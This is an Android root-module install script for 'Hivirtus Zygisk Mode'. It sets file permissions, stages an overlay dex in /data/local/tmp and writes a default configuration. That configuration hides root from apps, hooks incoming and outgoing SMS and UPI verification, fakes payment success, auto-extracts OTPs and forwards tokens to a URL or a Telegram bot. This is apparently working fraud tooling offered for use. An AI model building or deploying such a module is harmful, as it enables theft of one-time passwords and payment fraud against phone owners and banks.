#!/system/bin/sh
# Hivirtus Zygisk Mode — sirf ZIP flash, koi APK install nahi

ui_print "*******************************"
ui_print "   Hivirtus Zygisk Mode v2.18.0  "
ui_print "   Zygisk Base Mode By @Hivirtus  "
ui_print "*******************************"

if [ -z "$MODPATH" ]; then
  ui_print "! ERROR: MODPATH not set"
  abort "Installation failed"
fi

ui_print "- Installing to $MODPATH"
ui_print "- ZIP only — no separate APK"

set_perm_recursive "$MODPATH/zygisk" 0 0 0755 0644
[ -f "$MODPATH/post-fs-data.sh" ] && set_perm "$MODPATH/post-fs-data.sh" 0 0 0755
[ -f "$MODPATH/service.sh" ] && set_perm "$MODPATH/service.sh" 0 0 0755
[ -f "$MODPATH/start_overlay.sh" ] && set_perm "$MODPATH/start_overlay.sh" 0 0 0755
[ -f "$MODPATH/system/bin/hivirtus-overlay" ] && set_perm "$MODPATH/system/bin/hivirtus-overlay" 0 0 0755
[ -f "$MODPATH/customize.sh" ] && set_perm "$MODPATH/customize.sh" 0 0 0755
[ -f "$MODPATH/config.json" ] && set_perm "$MODPATH/config.json" 0 0 0644
[ -f "$MODPATH/module.prop" ] && set_perm "$MODPATH/module.prop" 0 0 0644

if [ ! -f "$MODPATH/overlay/overlay.dex" ]; then
  ui_print "! WARNING: overlay.dex missing — bubble nahi aayega"
fi

if [ ! -f "$MODPATH/config.json" ]; then
  ui_print "- Creating default config"
  cat > "$MODPATH/config.json" << 'EOF'
{
  "hide_root": true,
  "hide_developer": true,
  "hide_magisk": true,
  "hide_kernelsu": true,
  "hide_apatch": true,
  "hide_sukisu": true,
  "hide_all_root_apps": true,
  "enable_sim1_mock": false,
  "enable_sim2_mock": false,
  "enable_phone_spoof": false,
  "mock_country_iso": "in",
  "hook_incoming_sms": true,
  "hook_outgoing_sms": true,
  "hook_upi_verification": true,
  "intercept_fake_success": true,
  "always_show_menu": false,
  "auto_extract_otp": true,
  "auto_forward_token": true,
  "forward_url": "",
  "telegram_chat_id": "",
  "telegram_bot_token": "",
  "log_file": "/data/local/tmp/hivirtus_zygisk_mode.log"
}
EOF
  set_perm "$MODPATH/config.json" 0 0 0644
fi

# Overlay assets → /data/local/tmp (APatch SELinux friendly)
if [ -f "$MODPATH/overlay/overlay.dex" ]; then
  ui_print "- Syncing overlay.dex to /data/local/tmp"
  mkdir -p /data/local/tmp/hivirtus_overlay/ui
  cp -f "$MODPATH/overlay/overlay.dex" /data/local/tmp/hivirtus_overlay/overlay.dex
  [ -d "$MODPATH/overlay/ui" ] && cp -rf "$MODPATH/overlay/ui/"* /data/local/tmp/hivirtus_overlay/ui/
  chmod -R 755 /data/local/tmp/hivirtus_overlay 2>/dev/null
  chmod 644 /data/local/tmp/hivirtus_overlay/overlay.dex 2>/dev/null
  appops set com.android.shell SYSTEM_ALERT_WINDOW allow 2>/dev/null
  cmd appops set com.android.shell SYSTEM_ALERT_WINDOW allow 2>/dev/null
fi

if [ -d /data/adb/apatch ]; then
  ui_print "- APatch: bubble ZIP dex se (no APK)"
  ui_print "! Zygote crash = SMS inject band, bubble alag chalega"
elif [ -d /data/adb/ksu ] || [ -f /dev/kernelsu ]; then
  ui_print "- KernelSU detected"
elif [ -f /data/adb/magisk.db ]; then
  ui_print "- Magisk detected"
fi

echo "1" > /data/local/tmp/hivirtus_module_installed.flag
chmod 644 /data/local/tmp/hivirtus_module_installed.flag 2>/dev/null

ui_print "- Left OTP bubble — embedded dex only"
ui_print "- Tap = HTML menu | Manual: su -c hivirtus-overlay"
ui_print "- Reboot to activate"
